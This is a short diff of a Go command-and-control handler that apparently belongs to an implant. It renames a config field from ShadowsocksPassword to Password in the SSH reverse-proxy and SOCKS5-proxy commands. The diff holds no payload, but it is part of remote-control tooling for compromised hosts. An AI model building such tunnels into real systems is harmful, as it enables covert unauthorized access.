@@ -68,7 +68,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		addr += ":" + RuntimeConfig.SSHProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
-		if err = tun.SSHReverseProxyClient(addr, RuntimeConfig.ShadowsocksPassword, &ReverseConns, ctx, cancel); err != nil {
+		if err = tun.SSHReverseProxyClient(addr, RuntimeConfig.Password,
+			&ReverseConns, ctx, cancel); err != nil {
 			out = err.Error()
 		}
 		return
@@ -117,7 +118,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
 			RuntimeConfig.ShadowsocksPort,
-			RuntimeConfig.ShadowsocksPassword)
+			RuntimeConfig.Password)
 		return
 
 		// port fwd
